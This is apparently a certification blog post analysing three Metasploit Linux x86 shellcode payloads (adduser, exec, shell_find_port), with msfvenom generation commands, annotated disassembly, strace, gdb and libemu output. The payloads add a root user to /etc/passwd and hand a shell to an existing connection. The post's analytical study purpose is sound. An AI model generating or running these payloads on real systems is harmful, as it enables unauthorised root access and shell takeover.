---
layout: post
title: "SLAE Assignment #5 | Shellcode analysis of 3 msf payloads"
date: 2016-03-28
comments: true
categories:
---

An analysis of three shellcodes inner workings from the metasploit framework.

* [linux/x86/adduser](#adduser)
* [linux/x86/exec](#exec)
* [linux/x86/shell_find_port](#findPort)


## linux/x86/adduser <a name="adduser"></a>
*Create a new user with UID 0*

At a quick glance and over a reflection what needs to be done we can assume the following:

* /etc/passwd will be edited to have the new user inserted.
* The shellcode must have root rights to be able to modify the file.

The analysis with my comments inserted:

```
root@kali:~# msfvenom --platform=linux -a x86 -p linux/x86/adduser PASS=password USER=fisk | ndisasm -b 32 -p intel -k 43,34  -
No encoder or badchars specified, outputting raw payload
Payload size: 91 bytes

00000000  31C9              xor ecx,ecx //2nd argument = 0
00000002  89CB              mov ebx,ecx  //1nd argument = 0
00000004  6A46              push byte +0x46
00000006  58                pop eax // Set system call to 0x46=70=setreuid
00000007  CD80              int 0x80 // setreuid(0, 0); ie set operating proc. id to 0, root.

00000009  6A05              push byte +0x5
0000000B  58                pop eax // Set system call to 0x5=open
0000000C  31C9              xor ecx,ecx // ecx = 0
0000000E  51                push ecx // [esp] = 0
0000000F  6873737764        push dword 0x64777373 // dwss, reversed =sswd
00000014  682F2F7061        push dword 0x61702f2f // ap//, reversed = //pa
00000019  682F657463        push dword 0x6374652f // cte/, reversed = /etc
        
        esp: | /etc
             | //pa
             | sswd
             | 0000

0000001E  89E3              mov ebx,esp // 1nd argument points to esp.
00000020  41                inc ecx // ecx++, ecx=1
00000021  B504              mov ch,0x4 // ch = 0x4 --> ecx = 0x401 =  1025
00000023  CD80              int 0x80 //open("/etc//passwd",int flags=1025)

00000025  93                xchg eax,ebx //swap(eax,ebx), ebx=file descriptor
00000026  E822000000        call dword 0x4d
0000002B  skipping 0x22 bytes  

  root@kali:~/libemu-master/tools# dd skip=42 count=34 bs=1 < shellcode
  fisk:AzSzB2uy8JFlk:0:0::/:/bin/sh

0000004D  59                pop ecx // 2nd argument, ecx = return address for the call at 26, ie 2B.
0000004E  8B51FC            mov edx,[ecx-0x4] //3nd argument, edx = 2B-4=27, edx = [27] = 22000000 = 34, number of bytes to write.
00000051  6A04              push byte +0x4
00000053  58                pop eax //eax=4, write call.
00000054  CD80              int 0x80 // write(file descriptor in ebx, "fisk:AzSzB2uy8JFlk:0:0::/:/bin/sh", 34)
00000056  6A01              push byte +0x1
00000058  58                pop eax //eax=1, exit call
00000059  CD80              int 0x80 // exit(return of write)
```

By some reason Libemu did not want emulate this assembly so a real strace will do instead.
I'll put the shellcode in a C file that runs it.

```
strace ./run
....crap data from before shellcode starts....
open("/etc//passwd", O_WRONLY|O_APPEND) = 3
write(3, "fisk:AzSzB2uy8JFlk:0:0::/:/bin/s"..., 34) = 34
_exit(3)                                = ?
+++ exited with 3 +++
```

The result is almost as expected, only thing that worth noting is that the exit parameter is 3.
This is because it is the leftover set to be the file descriptor at the write call.

```sh
gdb-peda$ disas 0x080497d6, 0x080497db
Dump of assembler code from 0x80497d6 to 0x80497db:
   0x080497d6 <code+86>:    push   0x1
   0x080497d8 <code+88>:    pop    eax
=> 0x080497d9 <code+89>:    int    0x80
End of assembler dump.
gdb-peda$ print /x $eip
$2 = 0x80497d9
gdb-peda$ print /x $eax
$3 = 0x1
gdb-peda$ print /x $ebx
$4 = 0x3
```

## linux/x86/exec <a name="exec"></a>
*Execute an arbitrary command*

Executing a command in linux is simple.
A call to [int execve(const char *filename, char *const argv[], char *const envp[]);](http://linux.die.net/man/2/execve) will suffice.

The analysis with my comments inserted:

```
root@kali:~/Desktop# msfvenom --platform=linux -a x86 -p linux/x86/exec CMD=ls | ndisasm -u -
No encoder or badchars specified, outputting raw payload

00000000  6A0B              push byte +0xb
00000002  58                pop eax //eax=0xb or 11d
00000003  99                cdq //sign extend to edx, edx=0

Verifying that edx=0 in gdb:
gdb-peda$ disas
Dump of assembler code for function code:
   0x08049780 <+0>: push   0xb
   0x08049782 <+2>: pop    eax
   0x08049783 <+3>: cdq    
=> 0x08049784 <+4>: push   edx

gdb-peda$ print /x $edx
$2 = 0x0

00000004  52                push edx // [esp] = 0
00000005  66682D63          push word 0x632d //[esp] = 0x632d, ascii reversed: "-c"
00000009  89E7              mov edi,esp //[edi] = [esp]
0000000B  682F736800        push dword 0x68732f // [esp] = 0x68732f, ascii reversed: "/sh "
00000010  682F62696E        push dword 0x6e69622f //[esp] = 0x68732f, ascii reversed: "/bin"
00000015  89E3              mov ebx,esp //ebx=esp
00000017  52                push edx //[esp]=edx
00000018  E803000000        call dword 0x20 -----------------------------------|
                                                                               |
0000001D  6C                insb                                               |
0000001E  7300              jnc 0x20                                           |
                                                                               |
The two instructions above are skipped and suspected                           |
to be part of an argument, lets check it with GDB:                             |
                                                                               |
peda$ x/s 0x0804979d                                                           |
0x804979d <code+29>:     "ls"                                                  |
                                                                               |
00000020  57                push edi // [esp]=edi=pointerToString: "-c" <------|
00000021  53                push ebx // [esp]=pointerToString: "/bin/sh "
00000022  89E1              mov ecx,esp // ecx=[esp], {"bin/sh", "-c", "ls", 0}
00000024  CD80              int 0x80 

The call:
int execve("/bin/sh ",  {"bin/sh", "-c", "ls", 0}, 0);
```

Lets verify it with Libemu:

```
root@kali:~/Desktop# msfvenom --platform=linux -a x86 -p linux/x86/exec CMD=ls | /opt/libemu/bin/sctest -vSs 10000
verbose = 1
No encoder or badchars specified, outputting raw payload

execve
int execve (const char *dateiname=00416fc0={/bin/sh}, const char * argv[], const char *envp[]);
cpu error error accessing 0x00000004 not mapped

stepcount 15
int execve (
     const char * dateiname = 0x00416fc0 => 
           = "/bin/sh";
     const char * argv[] = [
           = 0x00416fb0 => 
               = 0x00416fc0 => 
                   = "/bin/sh";
           = 0x00416fb4 => 
               = 0x00416fc8 => 
                   = "-c";
           = 0x00416fb8 => 
               = 0x0041701d => 
                   = "ls";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;

```

The output is clear and as expected.


## linux/x86/shell_find_port <a name="findPort"></a>
*Spawn a shell on an established connection*


At a quick glance and over a reflection what needs to be done we can assume the following:

* A loop will be used to increment port number.
* Some sort of function must be used to check if it is open.
* And another function to start use it.

```
root@kali:~/Desktop# msfvenom --platform=linux -a x86 -p linux/x86/shell_find_port | ndisasm -u -
No encoder or badchars specified, outputting raw payload
disas 
00000000  31DB              xor ebx,ebx
00000002  53                push ebx //[esp]=0
00000003  89E7              mov edi,esp //edi = esp
00000005  6A10              push byte +0x10 // [esp]=16d
00000007  54                push esp //[esp]=esp-1
00000008  57                push edi //[esp]=esp-3
00000009  53                push ebx // pushes 0
0000000A  89E1              mov ecx,esp //ecx=[esp]
0000000C  B307              mov bl,0x7 // ebx=7

         ______________
1   ---->|     0       | <- edi points here                    |
2   | -->|   0x10      |                                       |
3   | |__|    esp-1    | <- points at esp 1 positions above    | stack growth direction
4   -----|    esp-3    | <- points at esp 3 positions above    |
5        |     0       | <- ecx points here                    |
         |_____________|                                      \_/

Verifying it with GDB, bp at offset 0E.

gdb-peda$ x/5w $esp
0xbffff498: 0x00000000  0xbffff4a8  0xbffff4a4  0x00000010
0xbffff4a8: 0x00000000

                                                                    
0000000E  FF01              inc dword [ecx] //Increment index 5 (see figure above) <--------|
00000010  6A66              push byte +0x66                                                 |
00000012  58                pop eax //eax = 0x66, system call: sys_socketcall               |
00000013  CD80              int 0x80 //socketcall(ebx ,ecx)                                 |
                                                                                            |
Good explanation of sys_socketcall: http://isomerica.net/~dpn/socketcall1.pdf               |
ebx=7                                                                                       |
tomasuh@Crunch:~$ cat /usr/include/linux/net.h | grep 7                                     |
#define SYS_GETPEERNAME 7       /* sys_getpeername(2)       */                              |
ecx is a pointer to the arguments, look where ecx points in figure above.                   |
int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);                     |
So the call is sys_getpeername(0, espPointerAtInd4, espPointerAtInd3) the first time.       |
                                                                                            |
00000015  66817F02BB3E      cmp word [edi+0x2],0x3ebb                                       |
0000001B  75F1              jnz 0xe_________________________________________________________|

The comparision checks a part of addrlen, if it does not have a specific value, continue to loop.
Interesting is that gdb, ndisasm and libemu all gave different constant values it compared to,
but a reasonable assumption is that it will continue to loop until it finds an existing connection.

0000001D  5B                pop ebx //pop port number/file descriptor into ebx
0000001E  6A02              push byte +0x2
00000020  59                pop ecx //ecx=2
00000021  B03F              mov al,0x3f //eax=0x3f, system call: sys_dup2 <-----------|
00000023  CD80              int 0x80                                                  |
                                                                                      |
sys_dup2(port number, stderr)                                                         |
redirect stderr output to found established connection.                               |
                                                                                      |
00000025  49                dec ecx                                                   |
00000026  79F9              jns 0x21__________________________________________________|

While ecx is not negative loop back, ie do this for stdout and stdin too.

00000028  50                push eax //Push return value of dup which is 0.
00000029  682F2F7368        push dword 0x68732f2f
0000002E  682F62696E        push dword 0x6e69622f

Pushed in reversed order of characters (little endian)
Corrected order and ascii:
    //sh
    /bin
                            

00000033  89E3              mov ebx,esp //set ebx to point to start of /bin//sh
00000035  50                push eax //Push return value of dup which is 0.
00000036  53                push ebx //Push address of /bin//sh
00000037  89E1              mov ecx,esp //ecx = address of /bin//sh
00000039  99                cdq  //extend eax to edx, in this case sets edx to 0's.
0000003A  B00B              mov al,0xb //eax=0x0b, system call: sys_execve
0000003C  CD80              int 0x80

The call:
int execve("/bin//sh", {"/bin//sh",0}, 0)

```

I also graphed it with Libemu:

```
root@kali:~/Desktop# msfvenom --platform=linux -a x86 -p linux/x86/shell_find_port CMD=ls | /opt/libemu/bin/sctest -vSs 10000 -G out.dot
....
lots of sys_getpeername(2) calls.
graph output
root@kali:~/Desktop# dot -Tpng out.dot -o out.png
```
![graph](/images/graph.png)

The graph does not show longer as it dosn't find any existing connection to use, but the shellcode analysis above is pretty clear.

---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 569

